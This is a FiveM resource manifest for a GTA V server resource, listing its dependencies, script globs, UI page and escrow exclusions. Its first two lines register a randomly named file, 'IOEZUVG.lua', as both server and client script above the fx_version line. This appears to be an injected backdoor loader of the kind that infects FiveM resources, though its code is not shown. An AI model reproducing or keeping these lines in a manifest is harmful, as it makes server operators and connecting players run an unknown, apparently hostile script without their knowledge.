server_script "IOEZUVG.lua"
client_script "IOEZUVG.lua"
fx_version "cerulean"
game "gta5"
lua54 "yes"

version      '1.6.0'

shared_scripts {
    '@ox_lib/init.lua',
    "init.lua",
}

client_script "client/*.lua"
server_scripts {
    "@oxmysql/lib/MySQL.lua",
    "server/*.lua"
}

files {
    'web/dist/**/*',
    'config/*.lua',
    'data/*.lua',
    'data/*.json',
    'modules/**/**/*.lua',
    'locales/*.lua'
}

ui_page "web/dist/index.html"

escrow_ignore {
    'config/*',
    'data/*',
    'modules/**/*',
    'locales/*',
    'init.lua',
    'types.lua'
}

dependency '/assetpacks'